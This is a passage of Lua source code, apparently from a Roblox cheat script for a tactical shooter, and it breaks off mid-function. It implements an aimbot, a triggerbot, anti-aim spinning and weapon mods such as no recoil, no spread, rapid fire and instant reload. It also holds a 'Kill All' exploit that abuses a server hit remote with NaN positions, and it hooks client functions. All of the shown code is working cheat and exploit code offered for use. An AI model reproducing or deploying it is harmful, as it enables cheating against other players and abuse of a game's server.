    if not RuntimePack.canCombatFire() then return end

    local viewport = cam.ViewportSize
    local screenCenter = Vector2.new(viewport.X * 0.5, viewport.Y * 0.5)
    local fovRadius = getAimFovRadius()

    local targetPart, aimPoint = getClosestAimTarget(screenCenter, fovRadius)

    if not targetPart then return end
    if typeof(aimPoint) ~= "Vector3" then
        aimPoint = targetPart.Position
    end

    local smoothValue = getAimSmooth()
    local camPos = cam.CFrame.Position
    local aimDelta = aimPoint - camPos
    if aimDelta.Magnitude < 1e-4 then return end
    local targetCFrame = CFrame.lookAt(camPos, aimPoint)

    if smoothValue <= 1 then
        cam.CFrame = targetCFrame
    else
        dt = dt or (1 / 60)
        local alpha = math.clamp(1 / smoothValue * dt * 60, 0.01, 1)
        cam.CFrame = cam.CFrame:Lerp(targetCFrame, alpha)
    end
end

;(function()
local function isTriggerbotCheckSelected(name)
    local opt = Options.TriggerbotChecks
    local value = opt and opt.Value
    if type(value) ~= "table" then return false end
    if value[name] == true then return true end
    for _, v in pairs(value) do
        if v == name then return true end
    end
    return false
end

local function isTriggerbotFlashed()
    local pg = getPlayerGui()
    local blnd = pg and pg:FindFirstChild("Blnd")
    local blind = blnd and blnd:FindFirstChild("Blind")
    return blind and blind.BackgroundTransparency < 0.4 or false
end

local function isTriggerbotScopedWeapon()
    local client = getCachedClient()
    local gun = client and rawget(client, "gun")
    if typeof(gun) == "Instance" then
        if gun:FindFirstChild("Scoped") or gun:FindFirstChild("snipo") then
            return true
        end
    end
    local eqVal = getLocalEquippedTool()
    local gunName = eqVal and type(eqVal.Value) == "string" and eqVal.Value or nil
    if not gunName then return false end
    local weapons = getWeaponsFolder()
    local def = weapons and weapons:FindFirstChild(gunName)
    return def and (def:FindFirstChild("Scoped") ~= nil or def:FindFirstChild("snipo") ~= nil) or false
end

local function isTriggerbotInScope()
    if isADS() then return true end
    local pg = getPlayerGui()
    local gui = pg and (pg:FindFirstChild("GUI") or pg:FindFirstChild("Client"))
    local ch = gui and gui:FindFirstChild("Crosshairs")
    local scope = ch and ch:FindFirstChild("Scope")
    return scope and scope.Visible or false
end

local function checkTriggerbotConditions(character, humanoid)
    if not Toggles.TriggerbotEnable or not Toggles.TriggerbotEnable.Value then return false end
    if not isKeybindActive(Options.TriggerbotKeybind) then return false end
    if not character or not humanoid or humanoid.Health <= 0 then return false end

    if isTriggerbotCheckSelected("Flash") and isTriggerbotFlashed() then
        return false
    end

    if isTriggerbotCheckSelected("Air") then
        local state = humanoid:GetState()
        if state == Enum.HumanoidStateType.Jumping
            or state == Enum.HumanoidStateType.Freefall
            or humanoid.FloorMaterial == Enum.Material.Air
        then
            return false
        end
    end

    if isTriggerbotCheckSelected("Scope") and isTriggerbotScopedWeapon() and not isTriggerbotInScope() then
        return false
    end

    return true
end

local TriggerSmokeParams = RaycastParams.new()
TriggerSmokeParams.FilterType = Enum.RaycastFilterType.Include
local TriggerSmokeFilter = table.create(1)
local TRIGGER_PEEK_OFFSETS = {
    Vector2.new(8, 0), Vector2.new(-8, 0), Vector2.new(0, 8), Vector2.new(0, -8),
    Vector2.new(6, 6), Vector2.new(-6, 6), Vector2.new(6, -6), Vector2.new(-6, -6),
}

local function isPlayerCombatHitbox(inst)
    if not inst or not inst:IsA("BasePart") then return false end
    if not CONSTANTS.RealHitboxLookup[inst.Name] then return false end
    local model = inst:FindFirstAncestorOfClass("Model")
    return model ~= nil and Players:GetPlayerFromCharacter(model) ~= nil
end

local function triggerSmokeBlocks(cam, targetPos)
    if not isTriggerbotCheckSelected("Smoke") then return false end
    local rayIgnore = Workspace:FindFirstChild("Ray_Ignore")
    local smokesFolder = rayIgnore and rayIgnore:FindFirstChild("Smokes")
    if not smokesFolder then return false end
    TriggerSmokeFilter[1] = smokesFolder
    TriggerSmokeParams.FilterDescendantsInstances = TriggerSmokeFilter
    getgenv().IgnoreRaycastHook = true
    local smokeRay = Workspace:Raycast(cam.CFrame.Position, targetPos - cam.CFrame.Position, TriggerSmokeParams)
    getgenv().IgnoreRaycastHook = false
    return smokeRay and smokeRay.Instance ~= nil
end

local function rayTriggerHitboxAt(cam, screenPos, maxPierce)
    local ray = cam:ViewportPointToRay(screenPos.X, screenPos.Y)
    local ignore, ignoreCount = copyRayIgnoreList()
    VisibilityParams.FilterDescendantsInstances = ignore
    local origin = ray.Origin
    local remain = ray.Direction.Unit * 5000
    local rayResult = nil

    getgenv().IgnoreRaycastHook = true
    for _ = 1, maxPierce or 8 do
        local ok, result = pcall(function()
            return Workspace:Raycast(origin, remain, VisibilityParams)
        end)
        if not ok or not result or not result.Instance then
            rayResult = nil
            break
        end
        rayResult = result
        local inst = result.Instance
        if isPlayerCombatHitbox(inst) then
            break
        elseif shouldPierceRayHit(inst) then
            ignoreCount = ignoreCount + 1
            ignore[ignoreCount] = inst
            VisibilityParams.FilterDescendantsInstances = ignore
            origin = result.Position + remain.Unit * 0.05
        else
            local parent = inst.Parent
            local isAccessory = parent and parent:IsA("Accessory")
            local ownerChar = isAccessory and parent.Parent
            if isAccessory and ownerChar and ownerChar:FindFirstChildOfClass("Humanoid") then
                ignoreCount = ignoreCount + 1
                ignore[ignoreCount] = inst
                VisibilityParams.FilterDescendantsInstances = ignore
                origin = result.Position + remain.Unit * 0.05
            else
                break
            end
        end
    end
    getgenv().IgnoreRaycastHook = false

    local hitInstance = rayResult and rayResult.Instance
    if not hitInstance or not hitInstance.Parent or not isPlayerCombatHitbox(hitInstance) then
        return nil, nil
    end

    local hitPlayer, hitChar = nil, nil
    local cur = hitInstance
    while cur and cur ~= Workspace do
        if cur:IsA("Model") then
            local plr = Players:GetPlayerFromCharacter(cur)
            if plr then
                hitPlayer, hitChar = plr, cur
                break
            end
        end
        cur = cur.Parent
    end
    if not hitPlayer or not hitChar or not isTriggerEnemy(hitPlayer) or hasShield(hitChar) then
        return nil, nil
    end
    if not CombatScan.triggerHitboxOn(hitInstance.Name) then return nil, nil end
    local _, humanoid = getCachedCharacterParts(hitPlayer)
    if not humanoid or humanoid.Health <= 0 then return nil, nil end
    return hitInstance, rayResult.Position
end

local function findTriggerbotTarget(cam)
    local mousePos = UserInputService:GetMouseLocation()

    local hit, hitPos = rayTriggerHitboxAt(cam, mousePos, 10)
    if hit then
        if triggerSmokeBlocks(cam, hitPos) then return nil end
        return hit
    end

    for i = 1, #TRIGGER_PEEK_OFFSETS do
        local peekHit, peekPos = rayTriggerHitboxAt(cam, mousePos + TRIGGER_PEEK_OFFSETS[i], 6)
        if peekHit then
            if triggerSmokeBlocks(cam, peekPos) then return nil end
            return peekHit
        end
    end

    return nil
end

local function getTriggerbotHorizontalSpeed(rootPart)
    if not rootPart then return 0 end
    local vel = rootPart.AssemblyLinearVelocity
    return math.sqrt(vel.X * vel.X + vel.Z * vel.Z)
end

TriggerbotState.getSpreadAngle = function(rootPart)
    local character = LocalPlayer.Character
    local equipped = character and character:FindFirstChild("EquippedTool")
    local weaponName = equipped and type(equipped.Value) == "string" and equipped.Value or nil
    if not weaponName then return 0, nil end

    local weapons = getWeaponsFolder()
    local weapon = weapons and weapons:FindFirstChild(weaponName)
    local spread = weapon and weapon:FindFirstChild("Spread")
    if not spread or weapon:FindFirstChild("Melee") then return 0, nil end

    local client = getCachedClient()
    local accuracySd = client and tonumber(rawget(client, "accuracy_sd")) or 0.001
    local currentSpread = client and tonumber(rawget(client, "spread"))
    local movementSpread = client and tonumber(rawget(client, "spread2"))
    if currentSpread then
        return math.max(0, currentSpread + (movementSpread or 0)) * accuracySd, spread
    end

    local base = (tonumber(spread.Value) or 0) + (tonumber(spread.Stand and spread.Stand.Value) or 0)
    if base <= 20 and not weapon:FindFirstChild("SMGThing") then base = base / 10 end
    local move = tonumber(spread.Move and spread.Move.Value) or 0
    local speed = getTriggerbotHorizontalSpeed(rootPart)
    local maxSpeed = client and tonumber(rawget(client, "curspd")) or 256
    local movementFactor = math.clamp((speed - maxSpeed * 0.34 * 0.0625) / (maxSpeed * 0.61 * 0.0625), 0, 1)
    return (base + move * movementFactor) * accuracySd, spread
end

TriggerbotState.getTargetCoverage = function(targetPart, spreadAngle)
    if not targetPart or not targetPart.Parent or not targetPart:IsA("BasePart") then return 0 end
    if not spreadAngle or spreadAngle <= 1e-8 then return 1 end
    local cam = getCamera()
    if not cam then return 0 end
    local origin = cam.CFrame.Position
    local dist = (targetPart.Position - origin).Magnitude
    if dist <= 1e-3 then return 1 end
    local radius = 0.5 * math.max(targetPart.Size.X, targetPart.Size.Y, targetPart.Size.Z)
    if targetPart.Name == "Head" or targetPart.Name == "HeadHB" or targetPart.Name == "FakeHead" then
        radius = math.max(radius, 0.6)
    end
    local targetAngle = math.atan(radius / dist)
    return math.clamp(targetAngle / spreadAngle, 0, 1)
end

TriggerbotState.passesHitChance = function(targetPart, spreadAngle)
    if not spreadAngle or spreadAngle <= 1e-8 then return true end
    local hitChance = math.clamp(tonumber(Options.TriggerbotHitChance and Options.TriggerbotHitChance.Value) or 75, 1, 100)
    local coverage = TriggerbotState.getTargetCoverage(targetPart, spreadAngle)
    return coverage * 100 + 1e-3 >= hitChance
end

TriggerbotState.getRecoveryDelay = function(rootPart)
    local spreadAngle, spread = TriggerbotState.getSpreadAngle(rootPart)
    if not spread then return 0 end
    if not spreadAngle or spreadAngle <= 1e-8 then return 0 end
    local recovery = tonumber(spread.RecoveryTime and spread.RecoveryTime.Value) or 0.1
    return math.clamp(recovery * 0.08 + spreadAngle * 0.04, 0, 0.2)
end

TriggerbotState.getSpreadDelay = function(rootPart, targetPart)
    local spreadAngle, spread = TriggerbotState.getSpreadAngle(rootPart)
    if not spread then return 0 end
    if not TriggerbotState.passesHitChance(targetPart, spreadAngle) then
        return math.huge
    end
    return 0
end

TriggerbotState.getSpreadPixels = function()
    local _, _, rootPart = getCachedCharacterParts(LocalPlayer)
    local spreadAngle = TriggerbotState.getSpreadAngle(rootPart)
    local cam = getCamera()
    if not cam then return 0 end
    return math.max(0, math.deg(spreadAngle) * 10 * cam.ViewportSize.Y / 600)
end

TriggerbotState.getCoveragePercent = function(targetPart)
    local _, _, rootPart = getCachedCharacterParts(LocalPlayer)
    local spreadAngle = TriggerbotState.getSpreadAngle(rootPart)
    return TriggerbotState.getTargetCoverage(targetPart, spreadAngle) * 100
end

local function applyTriggerbotMagnet(cam)
    if not Toggles.TriggerbotMagnet or not Toggles.TriggerbotMagnet.Value then return end

    local magnetFov = 25
    local smoothFactor = 0.15
    local mousePos = UserInputService:GetMouseLocation()
    local magnetPoint = nil
    local bestDistance = math.huge

    for i = 1, #CombatScan.list do
        local entry = CombatScan.list[i]
        if not entry or not entry.player then continue end
        if not isTriggerEnemy(entry.player) then continue end

        local aimPoint = entry.strictPoint or (entry.walls == 0 and entry.point)
        local aimPart = entry.strictPart or (entry.walls == 0 and entry.part)
        if not aimPart or typeof(aimPoint) ~= "Vector3" then continue end

        local screenPoint = cam:WorldToViewportPoint(aimPoint)
        if screenPoint.Z <= 0 then continue end
        local dist = (Vector2.new(screenPoint.X, screenPoint.Y) - mousePos).Magnitude
        if dist <= magnetFov and dist < bestDistance then
            bestDistance = dist
            magnetPoint = aimPoint
        end
    end

    if magnetPoint then
        local targetCF = CFrame.new(cam.CFrame.Position, magnetPoint)
        cam.CFrame = cam.CFrame:Lerp(targetCF, smoothFactor)
    end
end

local function getWeapRemote()
    local events = ReplicatedStorage:FindFirstChild("Events")
    return events and events:FindFirstChild("weap") or nil
end

fireWeapShot = function()
    local weap = getWeapRemote()
    if not weap then return false end
    local ok = pcall(function() weap:Fire() end)
    return ok
end

fireSingleShot = function()
    local character = LocalPlayer.Character
    local _, humanoid = getCachedCharacterParts(LocalPlayer)
    if not character or not humanoid or humanoid.Health <= 0 then return end
    if TriggerbotState.IsFiring then return end

    local now = tick()
    local rate = (HitpartSilent.getFireRate and HitpartSilent.getFireRate()) or 0.1
    if now - TriggerbotState.LastFire < rate then return end

    TriggerbotState.IsFiring = true
    local fired = fireWeapShot()
    TriggerbotState.IsFiring = false
    if fired then
        TriggerbotState.LastFire = now
    end
end

updateTriggerbot = function()
    local now = tick()

    if Library and Library.IsMenuVisible and Library:IsMenuVisible() then
        return
    end
    if TriggerbotState.IsFiring then return end
    local cam = getCamera()
    if not cam then return end
    if not RuntimePack.canCombatFire() then
        TriggerbotState.DelayActive = false
        return
    end

    local character, humanoid, rootPart = getCachedCharacterParts(LocalPlayer)
    if not checkTriggerbotConditions(character, humanoid) then
        TriggerbotState.DelayActive = false
        return
    end

    local targetPart = findTriggerbotTarget(cam)

    if targetPart and targetPart.Parent then
        local hitChar = nil
        local cur = targetPart
        while cur and cur ~= Workspace do
            if cur:IsA("Model") and Players:GetPlayerFromCharacter(cur) then
                hitChar = cur
                break
            end
            cur = cur.Parent
        end
        local hitHum = hitChar and hitChar:FindFirstChildOfClass("Humanoid")
        if not hitHum or hitHum.Health <= 0 then
            targetPart = nil
        end
    end
    TriggerbotState.TargetPart = targetPart

    applyTriggerbotMagnet(cam)

    if not targetPart then
        TriggerbotState.DelayActive = false
        return
    end

    local spreadAngle = TriggerbotState.getSpreadAngle(rootPart)
    if not TriggerbotState.passesHitChance(targetPart, spreadAngle) then
        return
    end

    local delayMs = (Options.TriggerbotDelay and Options.TriggerbotDelay.Value) or 0
    if not TriggerbotState.DelayActive then
        TriggerbotState.DelayActive = true
        TriggerbotState.DelayUntil = now + (delayMs / 1000)
    end

    if now >= TriggerbotState.DelayUntil then
        if not TriggerbotState.passesHitChance(targetPart, TriggerbotState.getSpreadAngle(rootPart)) then
            return
        end
        fireSingleShot()
    end
end
end)()

local AntiAimState = {
    CFrame = CFrame.new(),
    PitchRandomAngle = 0,
    PitchRandomLastSwitch = 0,
    YawBaseAngle = 0,
    YawCurrentAngle = 0,
    YawJitterLastSwitch = 0,
    YawJitterFlip = false,
    YawRandomAngle = 0,
    YawRandomLastSwitch = 0,
    YawSpinAngle = 0,
    YawSpinLastUpdate = 0,
    AtTargetLastScan = 0,
    AtTargetPart = nil,
}

local function updateAntiAim()
    local pitchEnabled = Toggles.AntiAimPitchEnable and Toggles.AntiAimPitchEnable.Value
    local yawEnabled = Toggles.AntiAimYawEnable and Toggles.AntiAimYawEnable.Value
    local character = LocalPlayer.Character
    if not character then return end
    local _, humanoid, rootPart = getCachedCharacterParts(LocalPlayer)
    if not humanoid or not rootPart or humanoid.Health <= 0 then return end

    if not pitchEnabled and not yawEnabled then
        humanoid.AutoRotate = true
        humanoid.HipHeight = 2
        return
    end

    humanoid.HipHeight = 2
    humanoid.AutoRotate = not yawEnabled

    if pitchEnabled then
        local pitchMode = Options.AntiAimPitchMode and Options.AntiAimPitchMode.Value or "None"
        if pitchMode ~= "None" then
            local remote = getControlTurnRemote()
            if remote then
                local pitch = 0
                if pitchMode == "Down" then
                    pitch = -1
                elseif pitchMode == "Up" then
                    pitch = 1
                elseif pitchMode == "Custom" then
                    pitch = Options.AntiAimPitchCustom and Options.AntiAimPitchCustom.Value or 0
                elseif pitchMode == "Random" then
                    local pitchSpeedMs = Options.AntiAimPitchRandomSpeed and Options.AntiAimPitchRandomSpeed.Value or 1
                    if (tick() - AntiAimState.PitchRandomLastSwitch) * 1000 >= pitchSpeedMs then
                        local newPitch = math.random(-10, 10) / 10
                        while math.abs(newPitch - AntiAimState.PitchRandomAngle) < 0.2 do
                            newPitch = math.random(-10, 10) / 10
                        end
                        AntiAimState.PitchRandomAngle = newPitch
                        AntiAimState.PitchRandomLastSwitch = tick()
                    end
                    pitch = AntiAimState.PitchRandomAngle
                end
                pcall(function() remote:FireServer(pitch) end)
            end
        end
    end

    if yawEnabled then
        local yawTarget = Options.AntiAimYawMode and Options.AntiAimYawMode.Value or "Local"
        local baseYaw = 0
        if yawTarget == "Local" then
            local cam = Workspace.CurrentCamera
            if cam then
                local lookVector = cam.CFrame.LookVector
                baseYaw = math.deg(math.atan2(lookVector.X, lookVector.Z))
            end
        else
            local nowAt = tick()
            if nowAt - AntiAimState.AtTargetLastScan >= (1 / 60) then
                AntiAimState.AtTargetLastScan = nowAt
                local useTeamCheck = Toggles.RagebotTeamCheck and Toggles.RagebotTeamCheck.Value
                local bestPart, bestDist = nil, math.huge
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr == LocalPlayer then continue end
                    if useTeamCheck then
                        local myTeam, theirTeam = LocalPlayer.Team, plr.Team
                        if myTeam and theirTeam and theirTeam == myTeam then continue end
                    end
                    local ch = plr.Character
                    local hrpTarget = ch and ch:FindFirstChild("HumanoidRootPart")
                    local humTarget = ch and ch:FindFirstChildOfClass("Humanoid")
                    if hrpTarget and humTarget and humTarget.Health > 0 then
                        local d = (hrpTarget.Position - rootPart.Position).Magnitude
                        if d < bestDist then bestDist = d; bestPart = hrpTarget end
                    end
                end
                AntiAimState.AtTargetPart = bestPart
            end
            local bestPart = AntiAimState.AtTargetPart
            if bestPart and bestPart.Parent then
                local dir = (bestPart.Position - rootPart.Position) * Vector3.new(1, 0, 1)
                if dir.Magnitude > 0.1 then
                    baseYaw = math.deg(math.atan2(dir.X, dir.Z))
                end
            else
                AntiAimState.AtTargetPart = nil
            end
        end
        AntiAimState.YawBaseAngle = baseYaw

        local yawType = Options.AntiAimYawType and Options.AntiAimYawType.Value or "None"
        local yawDirection = Options.AntiAimYawDirection and Options.AntiAimYawDirection.Value or "Backwards"
        local yawAngle = baseYaw

        if yawDirection == "Backwards" then
            yawAngle = baseYaw
        elseif yawDirection == "Forwards" then
            yawAngle = baseYaw + 180
        end

        if yawType == "Custom" then
            local customYaw = Options.AntiAimYawCustom and Options.AntiAimYawCustom.Value or 0
            yawAngle = yawAngle + customYaw
        elseif yawType == "Jitter" then
            local jitterValue = Options.AntiAimYawJitterAngle and Options.AntiAimYawJitterAngle.Value or 90
            local jitterSpeed = Options.AntiAimYawJitterDelay and Options.AntiAimYawJitterDelay.Value or 100

            if (tick() - AntiAimState.YawJitterLastSwitch) * 1000 >= jitterSpeed then
                AntiAimState.YawJitterFlip = not AntiAimState.YawJitterFlip
                AntiAimState.YawJitterLastSwitch = tick()
            end
            yawAngle = yawAngle + (AntiAimState.YawJitterFlip and jitterValue or -jitterValue)
        elseif yawType == "Random" then
            local randomSpeed = Options.AntiAimYawRandomDelay and Options.AntiAimYawRandomDelay.Value or 200
            if (tick() - AntiAimState.YawRandomLastSwitch) * 1000 >= randomSpeed then
                AntiAimState.YawRandomAngle = math.random(0, 360)
                AntiAimState.YawRandomLastSwitch = tick()
            end
            yawAngle = yawAngle + AntiAimState.YawRandomAngle
        elseif yawType == "Spin" then
            local spinSpeed = Options.AntiAimYawSpinDelay and Options.AntiAimYawSpinDelay.Value or 5
            local now = tick()
            if spinSpeed > 0 then
                local deltaTime = (now - AntiAimState.YawSpinLastUpdate) * 1000
                AntiAimState.YawSpinAngle = (AntiAimState.YawSpinAngle + (deltaTime / spinSpeed) * 360) % 360
                AntiAimState.YawSpinLastUpdate = now
            end
            yawAngle = yawAngle + AntiAimState.YawSpinAngle
        end

        rootPart.CFrame = CFrame.new(rootPart.Position, rootPart.Position + Vector3.new(0, 0, -1)) * CFrame.Angles(0, math.rad(yawAngle), 0)
    end

end

applyNoRecoil = function(enabled)
    local weapons = getWeaponsFolder()
    if not weapons then
        if not enabled then table.clear(SavedRecoilValues) end
        return
    end
    for _, weaponFolder in ipairs(weapons:GetChildren()) do
        if not weaponFolder:IsA("Folder") then continue end
        local spread = weaponFolder:FindFirstChild("Spread")
        if not spread then continue end
        local recoil = spread:FindFirstChild("Recoil")
        if not recoil or not recoil:IsA("NumberValue") then continue end
        if enabled then
            if SavedRecoilValues[weaponFolder.Name] == nil then
                SavedRecoilValues[weaponFolder.Name] = recoil.Value
            end
            recoil.Value = 1
        else
            local original = SavedRecoilValues[weaponFolder.Name]
            if original ~= nil then
                recoil.Value = original
            end
            SavedRecoilValues[weaponFolder.Name] = nil
        end
    end
    if not enabled then table.clear(SavedRecoilValues) end
end

applyNoSpread = function(enabled)
    local client = getCachedClient()
    if not client then return end
    if enabled then
        if OriginalAccuracySd == nil then
            OriginalAccuracySd = client.accuracy_sd
        end
        client.accuracy_sd = 0
    else
        if OriginalAccuracySd ~= nil then
            client.accuracy_sd = OriginalAccuracySd
            OriginalAccuracySd = nil
        end
    end
end

applyInstaEquip = function(enabled)
    local weapons = getWeaponsFolder()
    if not weapons then return end
    if enabled then
        for _, weaponFolder in ipairs(weapons:GetChildren()) do
            if weaponFolder:IsA("Folder") then
                local equipTime = weaponFolder:FindFirstChild("EquipTime")
                if equipTime and equipTime:IsA("NumberValue") then
                    if InstaWeaponState.SavedEquipTimes[weaponFolder.Name] == nil then
                        InstaWeaponState.SavedEquipTimes[weaponFolder.Name] = equipTime.Value
                    end
                    equipTime.Value = 0
                end
            end
        end
    else
        for weaponName, original in pairs(InstaWeaponState.SavedEquipTimes) do
            local weaponFolder = weapons:FindFirstChild(weaponName)
            local equipTime = weaponFolder and weaponFolder:FindFirstChild("EquipTime")
            if equipTime and equipTime:IsA("NumberValue") then equipTime.Value = original end
        end
        table.clear(InstaWeaponState.SavedEquipTimes)
    end
end

applyInstaReload = function(enabled)
    local weapons = getWeaponsFolder()
    if not weapons then return end
    if enabled then
        for _, weaponFolder in ipairs(weapons:GetChildren()) do
            if weaponFolder:IsA("Folder") then
                local reloadTime = weaponFolder:FindFirstChild("ReloadTime")
                if reloadTime and reloadTime:IsA("NumberValue") then
                    if InstaWeaponState.SavedReloadTimes[weaponFolder.Name] == nil then
                        InstaWeaponState.SavedReloadTimes[weaponFolder.Name] = reloadTime.Value
                    end
                    reloadTime.Value = 0.1
                end
            end
        end
    else
        for weaponName, original in pairs(InstaWeaponState.SavedReloadTimes) do
            local weaponFolder = weapons:FindFirstChild(weaponName)
            local reloadTime = weaponFolder and weaponFolder:FindFirstChild("ReloadTime")
            if reloadTime and reloadTime:IsA("NumberValue") then reloadTime.Value = original end
        end
        table.clear(InstaWeaponState.SavedReloadTimes)
    end
end

local function getCurrentWeaponFireRateObject()
    local character = LocalPlayer.Character
    if not character then return nil, nil end

    local weaponName = nil
    local equippedToolValue = getLocalEquippedTool()
    if equippedToolValue then
        weaponName = tostring(equippedToolValue.Value)
    end

    if not weaponName then return nil, nil end

    local weapons = getWeaponsFolder()
    if not weapons then return nil, nil end

    local weaponFolder = weapons:FindFirstChild(weaponName)
    if not weaponFolder then return nil, nil end

    local fireRate = weaponFolder:FindFirstChild("FireRate")
    if fireRate and fireRate:IsA("NumberValue") then
        return fireRate, weaponName
    end

    return nil, nil
end

restoreAllRapidFireRates = function()
    local weapons = getWeaponsFolder()
    if weapons then
        for weaponName, original in pairs(RapidFireState.SavedFireRates) do
            local weaponFolder = weapons:FindFirstChild(weaponName)
            local fireRate = weaponFolder and weaponFolder:FindFirstChild("FireRate")
            if fireRate and fireRate:IsA("NumberValue") then
                fireRate.Value = original
            end
        end
    end
    table.clear(RapidFireState.SavedFireRates)
end

updateRapidFire = function()
    if not Toggles.GunModsRapidFire or not Toggles.GunModsRapidFire.Value then return end

    local fireRate, weaponName = getCurrentWeaponFireRateObject()
    if not fireRate or not weaponName then return end

    if RapidFireState.SavedFireRates[weaponName] == nil then
        RapidFireState.SavedFireRates[weaponName] = fireRate.Value
    end

    local original = RapidFireState.SavedFireRates[weaponName]
    local raw = (Options.GunModsRapidFireRate and Options.GunModsRapidFireRate.Value) or 1
    local multiplier = math.clamp(math.floor(raw * 2 + 0.5) / 2, 1, 50)
    local targetValue = original / multiplier
    if fireRate.Value ~= targetValue then
        fireRate.Value = targetValue
    end
end

restoreAllFullAutoValues = function()
    local weapons = getWeaponsFolder()
    if weapons then
        for weaponName, originalValue in pairs(FullAutoState.SavedAutoValues) do
            local weaponFolder = weapons:FindFirstChild(weaponName)
            if weaponFolder then
                local autoValue = weaponFolder:FindFirstChild("Auto")
                if autoValue and autoValue:IsA("BoolValue") and originalValue.Value ~= nil then
                    autoValue.Value = originalValue.Value
                end
                weaponFolder:SetAttribute("Auto", originalValue.HadAttribute and originalValue.Attribute or nil)
            end
        end
    end
    table.clear(FullAutoState.SavedAutoValues)
end

updateFullAuto = function()
    local weapons = getWeaponsFolder()
    if not weapons then return end

    if Toggles.MiscFullAuto and Toggles.MiscFullAuto.Value then
        for _, weaponFolder in ipairs(weapons:GetChildren()) do
            local autoValue = weaponFolder:FindFirstChild("Auto")
            if FullAutoState.SavedAutoValues[weaponFolder.Name] == nil then
                local attribute = weaponFolder:GetAttribute("Auto")
                FullAutoState.SavedAutoValues[weaponFolder.Name] = {
                    Value = autoValue and autoValue:IsA("BoolValue") and autoValue.Value or nil,
                    Attribute = attribute,
                    HadAttribute = attribute ~= nil,
                }
            end
            if autoValue and autoValue:IsA("BoolValue") then
                autoValue.Value = true
            end
            weaponFolder:SetAttribute("Auto", true)
        end
    else
        for weaponName, originalValue in pairs(FullAutoState.SavedAutoValues) do
            local weaponFolder = weapons:FindFirstChild(weaponName)
            if weaponFolder then
                local autoValue = weaponFolder:FindFirstChild("Auto")
                if autoValue and autoValue:IsA("BoolValue") and originalValue.Value ~= nil then
                    autoValue.Value = originalValue.Value
                end
                weaponFolder:SetAttribute("Auto", originalValue.HadAttribute and originalValue.Attribute or nil)
            end
        end
        table.clear(FullAutoState.SavedAutoValues)
    end
end

updateRCS = function()
    local weapons = getWeaponsFolder()
    if not weapons then return end

    if Toggles.GunModsNoRecoil and Toggles.GunModsNoRecoil.Value then return end

    local rcsEnabled = Toggles.RCSEnable and Toggles.RCSEnable.Value
    local rcsValue = Options.RCSValue and Options.RCSValue.Value or 0

    for _, weaponFolder in ipairs(weapons:GetChildren()) do
        if not weaponFolder:IsA("Folder") then continue end
        local spread = weaponFolder:FindFirstChild("Spread")
        if not spread then continue end
        local recoil = spread:FindFirstChild("Recoil")
        if not recoil or not recoil:IsA("NumberValue") then continue end

        if rcsEnabled and rcsValue > 0 then
            if RCSOriginalValues[weaponFolder.Name] == nil then
                RCSOriginalValues[weaponFolder.Name] = recoil.Value
            end
            local original = RCSOriginalValues[weaponFolder.Name]
            local reductionPercent = rcsValue / 100
            local newValue = original * (1 - reductionPercent)
            recoil.Value = math.max(newValue, 1)
        else
            local original = RCSOriginalValues[weaponFolder.Name]
            if original ~= nil then
                recoil.Value = original
                RCSOriginalValues[weaponFolder.Name] = nil
            end
        end
    end
end

local KillAllHitRemote
for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
    if obj:IsA("RemoteEvent") and obj.Name:lower():find("hit") then
        KillAllHitRemote = obj
        break
    end
end

local function updateKillAll()
    local autoEnabled = Toggles.ExploitKillAll and Toggles.ExploitKillAll.Value
    local keyActive = isKeybindActive(Options.ExploitKillAllKeybind)

    if not autoEnabled or not keyActive then return end

    local character = LocalPlayer.Character
    if not character then return end
    local _, humanoid = getCachedCharacterParts(LocalPlayer)
    if not humanoid or humanoid.Health <= 0 then return end

    local gun = character:FindFirstChild("Gun")
    local equippedToolValue = getLocalEquippedTool()
    if not gun or not equippedToolValue then return end

    local gunName = "AWP"
    local gunRef = gun
    local replicatedStorageWeapons = getWeaponsFolder()
    local awpFolder = replicatedStorageWeapons and replicatedStorageWeapons:FindFirstChild("AWP")
    if awpFolder then gunRef = awpFolder end

    local cam = getCamera()
    if not cam then return end
    local camPos = cam.CFrame.Position
    local serverTime = Workspace:GetServerTimeNow()
    local burstCount = 2
    local nanBypass = true

    for _, plr in pairs(Players:GetPlayers()) do
        if plr == LocalPlayer then continue end

        local myTeam = LocalPlayer.Team
        local theirTeam = plr.Team
        if myTeam ~= nil and theirTeam ~= nil and theirTeam == myTeam then continue end

        local playerCharacter = plr.Character
        if not playerCharacter then continue end

        local head = getCachedHead(plr, playerCharacter)
        local _, playerHumanoid = getCachedCharacterParts(plr)
        if not head or not playerHumanoid or playerHumanoid.Health <= 0 then continue end
        if hasShield(playerCharacter) then continue end

        if not KillAllHitRemote then continue end

        for burst = 1, burstCount do
            pcall(function()
                local posArg = nanBypass and {X = 0/0, Y = 0/0, Z = 0/0} or {X = head.Position.X, Y = head.Position.Y, Z = head.Position.Z}
                KillAllHitRemote:FireServer(
                    head, posArg, gunName, 4096, gunRef, nil, 1, false, true,
                    camPos, serverTime, Vector3.new(0, 1, 0),
                    true, true, true, true, true,
                    nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil
                )
            end)
        end
    end
end

local NanParticleGuard = { clientRef = nil, lastTry = 0, saved = nil }

local function isNanPos(pos)
    if typeof(pos) == "Vector3" then
        return pos.X ~= pos.X or pos.Y ~= pos.Y or pos.Z ~= pos.Z
    end
    if type(pos) == "table" then
        local x, y, z = pos.X, pos.Y, pos.Z
        return (type(x) == "number" and x ~= x)
            or (type(y) == "number" and y ~= y)
            or (type(z) == "number" and z ~= z)
    end
    return false
end

local function patchClientNanParticleGuard()
    local now = tick()
    if now - NanParticleGuard.lastTry < 1.5 then return end
    NanParticleGuard.lastTry = now

    local client = getCachedClient()
    if not client then
        NanParticleGuard.clientRef = nil
        return
    end
    if NanParticleGuard.clientRef == client and client.__valenokNanGuard then
        return
    end

    pcall(function()
        local rn = client.ReturnNormal
        if type(rn) ~= "function" then return end
        local saved = {
            client = client,
            rnOrig = rn,
            cbOrig = client.createbullethole,
            usedHook = false,
        }

        local oldRn = rn
        local function guardedReturnNormal(pos, part)
            if pos == nil or part == nil or isNanPos(pos) then
                return nil
            end
            local ok, face = pcall(oldRn, pos, part)
            if not ok then return nil end
            return face
        end

        local wrappedRn = (newcclosure and newcclosure(guardedReturnNormal)) or guardedReturnNormal
        if hookfunction then
            local hooked = pcall(function()
                oldRn = hookfunction(rn, wrappedRn)
            end)
            if hooked then
                saved.usedHook = true
                saved.rnWrapped = wrappedRn
            else
                client.ReturnNormal = wrappedRn
            end
        else
